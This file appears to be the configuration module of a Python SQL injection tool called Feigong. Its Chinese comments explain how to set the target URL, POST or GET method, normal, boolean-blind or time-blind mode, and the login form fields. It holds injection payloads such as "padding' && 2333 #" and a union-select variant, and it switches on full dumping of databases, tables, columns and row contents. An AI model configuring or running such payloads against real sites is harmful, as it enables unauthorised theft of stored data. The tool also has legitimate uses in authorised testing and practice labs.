#!/usr/bin/env python
# -*- coding:utf-8 -*-

__author__ = "LoRexxar"


class BaseConfig:
    def __init__(self):
        """
        基类初始化，整个注入工具的核心配置
        """
        # 目标url
        self.url = 'http://demo.lorexxar.pw/post.php'

        # 请求头参数
        # cookies = {"username":data,"path":"/admin/","domain":"451bf8ea3268360ee.jie.sangebaimao.com"}
        # self.headers = {"Cookie": "username=" + data + "; captcha=od8lgg6f7i71q16j9rd7p7j9a2; username=" + data}
        self.headers = {}

        # 传参方式 0为GET 1为POST
        SqliRequest = (
            "GET",
            "POST"
        )
        self.sqlirequest = SqliRequest[1]

        # 注入方式 0为正常 1为盲注 2为时间盲注
        SqliMethod = (
            "normal",
            "build",
            "time"
        )
        self.sqlimethod = SqliMethod[1]
        """
        从这里开始，要进入对于payload的配置了，首先需要对注入语句进行配置，然后注入语句通过自定义的替换表，之后构造注入语句为请求
        payload===>替换为指定payload===>自定义替换表===>请求===>开始注入

        若为normal注入，必须构造返回BSqlier的payload，并通过test模式修改解包函数直至可以获取返回值（必须以空格为分隔符，结尾必须只有一个词（结尾可以通过修改自定义替换表中的值来修改））
        eg: self.payload = "padding' union all select 1,'Feigong' #"

        若为build注入，则为与、或条件构造，如果是与注入，padding必须为返回值的条件
        eg: self.payload = "padding' && 2333 #"

        若为time注入，则可以使用上面两种的任何一种，格式与其相符，同样，关键位置使用2333或者'Feigong'填充
        eg: self.payload = "padding' union all select 1,'Feigong' #"
        eg: self.payload = "padding' && 2333 #"

        """
        self.payload = "padding' && 2333 #"

        """
        配置请求,把请求中payload的位置设置为Feigong（如果拼错了就会全部无效...）
        self.requesetformat = "user=Feigong&passwd=ddog123&submit=Log+In"
        self.requesetformat = {"user": "Feigong", "password": "a"}
        """
        # self.requesetformat = "user=Feigong&passwd=ddog123&submit=Log+In"
        self.requesetformat = {"user": "Feigong", "password": "a"}

        """
        在注入之前，你首先需要测试，test.py中包含所有的测试函数，包括test、get_now_database、get_version、get_user

        self.wtest是是否进入测试模式、测试模式优先级最高和普通模式不兼容，默认开启

        而testmethod则是选择使用那种测试，互相兼容可以同时跑
        """
        self.wtest = False

        self.testmethod = {
            "test": 0,
            "database": 1,
            "version": 1,
            "user": 1
        }
        """
        正式注入模式的选择，test模式开启时，无论正式注入模式是否开启都无效，默认开启

        all为全部注入，将自动从database注入直到数据前10条
        content为注入数据，可以预设columns、tables和database
        columns为注入列名，可以预设tables和database
        tables为注入表名，可以预设database
        database为注入表名
        统一规则为如果不预设，则自动调用上一层的类获取数据
        """
        self.wsqli = True

        self.sqlilocation = {
            "content": 1,
            "columns": 1,
            "tables": 1,
            "database": 1
        }
